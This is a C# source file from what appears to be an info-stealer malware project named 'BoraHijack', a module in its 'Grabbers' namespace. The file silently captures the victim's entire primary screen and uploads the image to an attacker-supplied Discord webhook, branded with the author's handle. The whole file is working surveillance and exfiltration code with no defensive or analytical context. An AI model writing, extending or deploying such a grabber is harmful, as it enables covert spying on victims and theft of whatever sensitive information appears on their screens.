using Discord;
using Discord.Webhook;
using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Threading.Tasks;
using System.Windows.Forms;
#pragma warning disable CS0028

namespace BoraHijack.Grabbers
{
    class Screenshot
    {
        public static async Task MainSS(string webhookUrl)
        {
            // 1. Capture screenshot
            Bitmap screenshot = new Bitmap(
                Screen.PrimaryScreen.Bounds.Width,
                Screen.PrimaryScreen.Bounds.Height);

            using (Graphics g = Graphics.FromImage(screenshot))
            {
                g.CopyFromScreen(0, 0, 0, 0, screenshot.Size);
            }

            // 2. Save screenshot to MemoryStream
            MemoryStream ms = new MemoryStream();
            screenshot.Save(ms, System.Drawing.Imaging.ImageFormat.Png);
            ms.Position = 0;

            // 3. Setup webhook client
            var client = new DiscordWebhookClient(webhookUrl);

            await client.SendFileAsync(
                stream: ms,
                filename: "screenshot.png",
                text: "", // or "Screenshot uploaded"
                isTTS: false,
                embeds: new[] {
                new EmbedBuilder()
                    .WithTitle("Screenshot Captured")
                    .WithDescription("")
                    .WithImageUrl("attachment://screenshot.png") // This works only if image is attached in same request
                    .WithCurrentTimestamp()
                    .WithFooter("made by vanity (v1s0or)")
                    .Build()
                },
                username: "BoraHijack",
                avatarUrl: "https://files.catbox.moe/zteeqk.png"
            );
        }
    }
}
